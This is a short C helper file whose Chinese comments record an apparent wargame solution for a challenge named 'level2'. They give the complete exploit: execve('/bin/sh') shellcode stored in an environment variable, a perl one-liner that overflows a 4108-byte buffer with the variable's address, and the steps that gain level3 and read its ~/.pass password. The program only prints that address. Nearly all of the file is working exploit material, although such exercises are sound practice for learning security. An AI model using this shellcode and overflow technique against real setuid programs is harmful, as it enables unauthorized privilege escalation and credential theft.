/*  首先通过strings ./level2获取第一个密码，然后利用buffer overflow
 *  来获取level3的权限
 *  export PAYLOAD=$'\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
* $ ./env
* 0xbfffdfb6
* $ ./level2 fsckmelogic $(perl -e 'print"A"x(4108)."\xb6\xdf\xff\xbf"')
* $ whoami
*  level3
* $ more ~/.pass
* PIZIPMWKEC
*
* */
#include <stdio.h>
#include <stdlib.h>
int main()
{
  printf ("%#x\n",getenv("PAYLOAD"));
  return 0;
}

/* 调试时发现程序获取的PAYLOAD的地址和打印出来的有可能不一样*/
